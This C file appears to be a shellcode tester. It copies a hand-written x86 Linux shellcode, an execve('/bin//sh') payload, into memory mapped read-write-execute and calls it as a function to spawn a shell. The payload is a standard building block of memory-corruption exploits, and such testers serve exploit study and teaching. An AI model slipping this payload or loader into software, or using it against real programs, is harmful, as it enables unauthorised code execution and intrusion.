#include <sys/mman.h>
#include <string.h>
#include <stdio.h>

int main() {
	const char *console_spawn = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
		"\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; 

	int len = strlen(console_spawn);

        void *buff = mmap(0, len, PROT_READ | PROT_WRITE | PROT_EXEC,
		       	MAP_SHARED | MAP_ANON, -1, 0);

	if (buff == MAP_FAILED) {
		printf("oops");
		return -1;
	}

	memcpy(buff, console_spawn, len);

	int (*fct)() = (int (*)()) buff;
	int rest = fct();

	printf("%d\n", rest);

	munmap(buff, len);
	return 0;
}
